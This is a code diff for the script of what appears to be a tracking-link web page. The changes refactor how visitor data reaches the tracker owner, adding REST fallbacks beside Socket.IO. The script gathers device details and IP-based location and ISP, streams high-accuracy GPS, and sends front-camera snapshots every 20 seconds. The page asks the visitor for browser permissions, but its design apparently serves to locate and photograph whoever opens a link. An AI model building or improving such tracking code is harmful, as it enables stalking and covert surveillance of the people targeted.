@@ -236,10 +236,13 @@
     let sharing = false;
 
     document.addEventListener('DOMContentLoaded', () => {
-      socket = io();
+      // Initialize socket with websocket preference (might fail on Vercel, but that's okay)
+      socket = io({
+        transports: ['websocket', 'polling']
+      });
       socket.emit('join-tracker', TRACKER_ID);
 
-      // Send basic device info first
+      // Basic device info
       const basicInfo = {
         platform: navigator.platform,
         browser: getBrowser(),
@@ -253,98 +256,83 @@
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
 
-      socket.emit('device-info', {
-        trackerId: TRACKER_ID,
-        info: basicInfo
-      });
+      sendDeviceInfo(basicInfo);
 
-      // Fetch IP, ISP, and network details
+      // Fetch network details
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
           const networkInfo = {
             ...basicInfo,
             ipAddress: data.ip || 'N/A',
-            ipVersion: data.version || 'N/A',
             isp: data.org || 'N/A',
-            asn: data.asn || 'N/A',
             city: data.city || 'N/A',
             region: data.region || 'N/A',
             country: data.country_name || data.country || 'N/A',
-            countryCode: data.country_code || 'N/A',
-            postal: data.postal || 'N/A',
-            latitude: data.latitude || 'N/A',
-            longitude: data.longitude || 'N/A',
             timezone: data.timezone || basicInfo.timezone
           };
-          socket.emit('device-info', {
-            trackerId: TRACKER_ID,
-            info: networkInfo
-          });
+          sendDeviceInfo(networkInfo);
         })
-        .catch(() => {
-          // Fallback: try ipinfo.io
-          fetch('https://ipinfo.io/json')
-            .then(res => res.json())
-            .then(data => {
-              const networkInfo = {
-                ...basicInfo,
-                ipAddress: data.ip || 'N/A',
-                isp: data.org || 'N/A',
-                city: data.city || 'N/A',
-                region: data.region || 'N/A',
-                country: data.country || 'N/A',
-                postal: data.postal || 'N/A',
-                timezone: data.timezone || basicInfo.timezone
-              };
-              socket.emit('device-info', {
-                trackerId: TRACKER_ID,
-                info: networkInfo
-              });
-            })
-            .catch(() => {});
-        });
+        .catch(() => {});
     });
+
+    async function sendDeviceInfo(info) {
+      // Try Socket first, then fallback to REST
+      if (socket && socket.connected) {
+        socket.emit('device-info', { trackerId: TRACKER_ID, info });
+      }
+      await fetch(`/api/tracker/${TRACKER_ID}/info`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(info)
+      });
+    }
+
+    async function sendLocationUpdate(data) {
+      if (socket && socket.connected) {
+        socket.emit('location-update', { trackerId: TRACKER_ID, ...data });
+      }
+      await fetch(`/api/tracker/${TRACKER_ID}/location`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    async function sendPhotoCapture(data) {
+      if (socket && socket.connected) {
+        socket.emit('photo-capture', { trackerId: TRACKER_ID, ...data });
+      }
+      await fetch(`/api/tracker/${TRACKER_ID}/photo`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
 
     async function startSharing() {
       const btn = document.getElementById('start-btn');
       btn.disabled = true;
       btn.textContent = 'Requesting permissions...';
 
-      // 1. Request Location
       try {
-        const pos = await requestLocation();
+        await requestLocation();
         document.getElementById('loc-section').classList.add('granted');
-        document.getElementById('loc-status').innerHTML = `
-          <span class="status-badge active">
-            <span class="live-dot"></span>
-            Location active
-          </span>`;
+        document.getElementById('loc-status').innerHTML = '<span class="status-badge active">Location active</span>';
         startLocationUpdates();
       } catch (e) {
         document.getElementById('loc-section').classList.add('denied');
-        document.getElementById('loc-status').innerHTML = `
-          <span class="status-badge error">
-            Location denied
-          </span>`;
+        document.getElementById('loc-status').innerHTML = '<span class="status-badge error">Location denied</span>';
       }
 
-      // 2. Request Camera (optional)
       try {
         await requestCamera();
         document.getElementById('cam-section').classList.add('granted');
-        document.getElementById('cam-status').innerHTML = `
-          <span class="status-badge active">
-            <span class="live-dot"></span>
-            Camera active — capturing...
-          </span>`;
+        document.getElementById('cam-status').innerHTML = '<span class="status-badge active">Camera active</span>';
         capturePhotos();
       } catch (e) {
         document.getElementById('cam-section').classList.add('denied');
-        document.getElementById('cam-status').innerHTML = `
-          <span class="status-badge error">
-            Camera denied
-          </span>`;
+        document.getElementById('cam-status').innerHTML = '<span class="status-badge error">Camera denied</span>';
       }
 
       sharing = true;
@@ -355,11 +343,7 @@
     function requestLocation() {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) return reject('Not supported');
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(pos),
-          err => reject(err),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
       });
     }
 
@@ -367,29 +351,18 @@
       watchId = navigator.geolocation.watchPosition(
         pos => {
           const { latitude, longitude, accuracy, altitude, speed, heading } = pos.coords;
-          socket.emit('location-update', {
-            trackerId: TRACKER_ID,
-            latitude,
-            longitude,
-            accuracy,
-            altitude,
-            speed,
-            heading
-          });
+          sendLocationUpdate({ latitude, longitude, accuracy, altitude, speed, heading });
           document.getElementById('coords-display').textContent = 
             `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy)}m)`;
         },
-        err => console.error('Location error:', err),
+        err => console.error(err),
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     }
 
     function requestCamera() {
       return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then(stream => {
-          cameraStream = stream;
-          return stream;
-        });
+        .then(stream => { cameraStream = stream; return stream; });
     }
 
     function capturePhotos() {
@@ -408,20 +381,14 @@
         function snap() {
           if (!sharing) return;
           ctx.drawImage(video, 0, 0);
-          const image = canvas.toDataURL('image/jpeg', 0.7);
-          socket.emit('photo-capture', {
-            trackerId: TRACKER_ID,
-            image,
-            facing: 'user'
-          });
-          // Capture every 15 seconds
-          setTimeout(snap, 15000);
+          const image = canvas.toDataURL('image/jpeg', 0.6);
+          sendPhotoCapture({ image, facing: 'user' });
+          setTimeout(snap, 20000);
         }
-
-        // First capture after 3 seconds
         setTimeout(snap, 3000);
       };
     }
+
 
     function getBrowser() {
       const ua = navigator.userAgent;
